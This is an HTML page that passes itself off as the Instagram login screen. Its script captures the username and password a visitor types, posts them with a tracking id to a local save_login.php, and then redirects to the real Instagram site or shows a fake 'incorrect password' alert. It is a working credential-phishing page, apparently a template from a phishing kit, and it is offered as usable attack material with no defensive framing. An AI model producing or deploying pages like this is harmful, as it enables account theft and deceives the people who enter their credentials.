<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: #fafafa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
        }
        .gradient-bar {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, #f58529, #dd2a7b, #8134af, #515bd4);
        }
        .card {
            width: 100%;
            max-width: 350px;
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 36px 40px 28px;
            text-align: center;
        }
        .logo {
            font-family: "Segoe UI", system-ui, sans-serif;
            font-size: 2.5rem;
            font-weight: 400;
            background: linear-gradient(45deg, #f58529, #dd2a7b, #8134af);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 28px;
            letter-spacing: -0.5px;
        }
        .form-input {
            width: 100%;
            height: 38px;
            margin-bottom: 6px;
            padding: 0 10px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            outline: none;
        }
        .form-input:focus {
            border-color: #a8a8a8;
        }
        .btn {
            width: 100%;
            height: 32px;
            margin-top: 12px;
            border: none;
            border-radius: 8px;
            background: #0095f6;
            color: #fff;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
        }
        .btn:hover { background: #1877f2; }
        .forgot {
            display: block;
            margin-top: 18px;
            font-size: 12px;
            color: #00376b;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="gradient-bar" aria-hidden="true"></div>
    <div class="card">
        <div class="logo">Instagram</div>
        <form id="loginForm">
            <input type="text" class="form-input" id="email" placeholder="Phone number, username, or email" required autocomplete="username">
            <input type="password" class="form-input" id="password" placeholder="Password" required autocomplete="current-password">
            <button type="submit" class="btn">Log in</button>
        </form>
        <a class="forgot" href="#" onclick="return false;">Forgot password?</a>
    </div>
    <script>
        var BASE_URL = window.location.origin + (window.location.pathname.replace(/[^/]*$/, '') || '/');
        document.getElementById('loginForm').addEventListener('submit', function (e) {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const tid = typeof window.TRACKIFY_TID === 'string' ? window.TRACKIFY_TID : (new URLSearchParams(window.location.search).get('tid') || '');
            const btn = document.querySelector('.btn');
            btn.textContent = 'Please wait…';
            btn.disabled = true;
            $.ajax({
                type: 'POST',
                url: BASE_URL + 'save_login.php',
                data: { tid: tid, login: email, password: password, template: 'instagram' },
                dataType: 'json',
                success: function (data) {
                    if (data && data.ok) {
                        window.location.href = 'https://www.instagram.com/';
                        return;
                    }
                    btn.textContent = 'Log in';
                    btn.disabled = false;
                    alert('Sorry, your password was incorrect. Please try again.');
                },
                error: function () {
                    btn.textContent = 'Log in';
                    btn.disabled = false;
                    alert('Sorry, your password was incorrect. Please try again.');
                }
            });
        });
    </script>
</body>
</html>
